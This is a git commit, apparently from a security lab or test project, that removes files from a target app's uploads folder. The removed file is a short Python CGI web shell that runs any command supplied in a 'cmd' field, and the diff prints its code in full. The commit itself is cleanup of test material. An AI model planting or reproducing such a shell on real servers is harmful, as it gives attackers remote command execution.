32ede103f4ca130fbf3bc8275a14f90017933036
tayothecoder <o.aseniserare2@rgu.ac.uk>
2026-02-19 12:09:53 +0100

    remove uploaded shells and test files

--- 02-target-app/uploads/shell.py
+++
@@ -1,7 +0,0 @@
-#!/usr/bin/env python3
-import subprocess
-import cgi
-print("Content-Type: text/html\n")
-form = cgi.FieldStorage()
-cmd = form.getvalue("cmd", "id")
-print(f"<pre>{subprocess.getoutput(cmd)}</pre>")
